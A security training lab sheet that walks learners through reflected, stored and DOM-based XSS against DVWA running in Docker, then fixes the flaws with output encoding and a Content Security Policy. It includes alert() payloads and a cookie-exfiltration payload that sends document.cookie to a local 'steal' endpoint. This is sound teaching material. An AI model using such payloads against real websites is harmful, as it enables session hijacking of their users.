# Lab 5: Cross-Site Scripting (XSS) Exploitation and Mitigation

**Module:** 5 – Web Security and Application Protection
**Unit:** 2 – Web Application Security
**Estimated Duration:** 90 minutes
**Difficulty:** Intermediate

## Objective
Exploit reflected, stored, and DOM-based XSS vulnerabilities, then apply input validation and output encoding as mitigation.

## Prerequisites
- Completion of Lab 4
- Basic HTML/JavaScript familiarity

## Tools Required
- DVWA or OWASP Juice Shop (Docker)
- Browser with developer tools

## Ethics & Safety Note
Test only in your isolated lab deployment. Never inject scripts into third-party or production websites.

## Step-by-Step Instructions

### Step 1: Deploy the Vulnerable Application
```
docker run --rm -it -p 80:80 vulnerables/web-dvwa
```
Set DVWA Security to **Low**.

### Step 2: Reflected XSS
1. Navigate to **XSS (Reflected)**.
2. In the name field, enter:
   ```html
   <script>alert('Reflected XSS')</script>
   ```
3. Submit and observe the alert box firing immediately — the payload is reflected back without sanitization.

### Step 3: Stored XSS
1. Navigate to **XSS (Stored)** (often the Guestbook module).
2. In the message field, enter:
   ```html
   <script>alert('Stored XSS')</script>
   ```
3. Submit, then reload the page.
4. Observe that the alert fires again on page load — confirming the payload was persisted in the database and executes for every visitor.

### Step 4: DOM-Based XSS
1. Navigate to **XSS (DOM)**.
2. Modify the URL parameter directly, e.g.:
   ```
   ?default=<script>alert('DOM XSS')</script>
   ```
3. Observe that client-side JavaScript inserts the payload into the page without server involvement.

### Step 5: Demonstrate Session/Cookie Theft (Educational Simulation)
Using a safe, local-only payload (no external server), show how an attacker could exfiltrate cookies:
```html
<script>document.location='http://localhost/steal?cookie='+document.cookie</script>
```
Explain that in a real attack this would send the victim's session cookie to an attacker-controlled server.

### Step 6: Identify the Vulnerable Code
View source and locate where user input is echoed into HTML without encoding, e.g.:
```php
echo "Hello " . $_GET['name'];
```

### Step 7: Remediate with Output Encoding
Rewrite using proper HTML entity encoding:
```php
echo "Hello " . htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8');
```
Explain that this converts `<`, `>`, `"`, `'` into harmless HTML entities so the browser renders them as text, not executable code.

### Step 8: Add a Content Security Policy Header (Defense in Depth)
Add a response header:
```
Content-Security-Policy: default-src 'self'; script-src 'self'
```
Explain how this blocks inline scripts even if encoding is bypassed.

### Step 9: Re-test at Higher Security Levels
Set DVWA Security to **Medium/High** and repeat Steps 2–4, documenting how the application now sanitizes or blocks the payloads.

### Step 10: Document Findings
Produce a short report covering:
- Type of XSS exploited (reflected/stored/DOM)
- Payload used
- Business impact (session hijacking, defacement, phishing)
- Remediation applied and retest results

## Expected Outcome
Learners can distinguish reflected, stored, and DOM XSS, demonstrate exploitation safely, and apply encoding and CSP as mitigations.

## Cleanup
- Stop the Docker container.
- Clear browser cache/cookies used during testing.

## Review Questions
1. Why is stored XSS generally considered more dangerous than reflected XSS?
2. Why does `htmlspecialchars()` neutralize a script tag?
3. How does a strong CSP header reduce XSS impact even if a sanitization flaw exists?
